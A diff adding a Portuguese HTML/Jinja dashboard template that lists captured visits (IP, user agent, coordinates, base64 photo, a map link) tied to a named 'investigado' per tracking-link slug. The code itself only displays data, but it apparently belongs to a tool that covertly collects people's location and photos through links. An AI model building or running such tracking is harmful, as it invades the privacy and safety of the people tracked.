@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Painel de Acessos</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #141e30, #243b55);
+            color: #fff;
+            padding: 40px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+
+        th, td {
+            padding: 12px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        th {
+            background-color: rgba(0, 184, 148, 0.6);
+        }
+
+        img {
+            border-radius: 6px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.4);
+        }
+
+        tr:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .voltar {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #00b894;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 6px;
+            transition: background-color 0.3s;
+        }
+
+        .voltar:hover {
+            background-color: #019875;
+        }
+
+        .mapa-btn {
+            background-color: #0984e3;
+            color: white;
+            padding: 6px 10px;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: background-color 0.3s;
+        }
+
+        .mapa-btn:hover {
+            background-color: #74b9ff;
+        }
+    </style>
+</head>
+<body>
+    <h2>📊 Registros Recentes</h2>
+    <table>
+        <tr>
+            <th>ID</th>
+            <th>IP</th>
+            <th>User-Agent</th>
+            <th>Latitude</th>
+            <th>Longitude</th>
+            <th>Data</th>
+            <th>Investigado</th>
+            <th>Foto</th>
+            <th>Localização</th>
+        </tr>
+        {% for r in registros %}
+        <tr>
+            <td>{{ r.id }}</td>
+            <td>{{ r.ip }}</td>
+            <td>{{ r.user_agent }}</td>
+            <td>{{ r.latitude }}</td>
+            <td>{{ r.longitude }}</td>
+            <td>{{ r.timestamp }}</td>
+            <td>{{ links.get(r.slug, "Desconhecido") }}</td> <!-- Nome do investigado -->
+            <td>
+                {% if r.foto_base64 %}
+                    <img src="{{ r.foto_base64 }}" width="100">
+                {% else %}
+                    —
+                {% endif %}
+            </td>
+            <td>
+                {% if r.latitude and r.longitude %}
+                    <a href="https://www.google.com/maps?q={{ r.latitude }},{{ r.longitude }}" target="_blank" class="mapa-btn">
+                        Ver no Maps
+                    </a>
+                {% else %}
+                    —
+                {% endif %}
+            </td>
+        </tr>
+        {% endfor %}
+    </table>
+
+    <div style="text-align:center; margin-top: 20px;">
+        <a href="/gerenciar" class="voltar">⬅ Voltar ao Gerenciamento</a>
+    </div>
+</body>
+
+</html>
